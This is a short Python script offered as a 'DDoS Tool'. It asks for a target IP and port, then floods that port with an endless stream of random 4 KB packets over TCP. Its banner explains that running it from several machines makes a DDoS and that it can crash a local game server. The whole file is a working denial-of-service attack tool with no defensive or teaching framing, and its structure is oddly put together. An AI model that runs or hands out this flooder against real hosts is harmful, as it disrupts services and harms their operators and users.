import socket
import os

class main():
	print("===== DDoS Tool V1.1 =====\n1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the TCP/IP protocol.\n3.If you do it on one computer, it's called DoS.\n4.If you do it on multiple computers, it's called DDoS.\n5.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n\n")
	# Def Obj
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# Input
	target = str(input("Enter Target IP : "))
	port = int(input("Enter Port : "))

	# Generate Data to Send
	data = os.urandom(4096) # ขนาด 4 KB

	# นับ Packet ของ Data
	send = 1
    
	try :
		s.connect((target, port))
	except socket.ConnectionRefusedError :
		print("Can't connect to server")
		s.close()
		main()

	# การทำงาน
	while True:
		s.send(data)

		print("Sending ", send, "To", target, "with port", port)
		send = send + 1

if __name__ == "__main__":
	main()
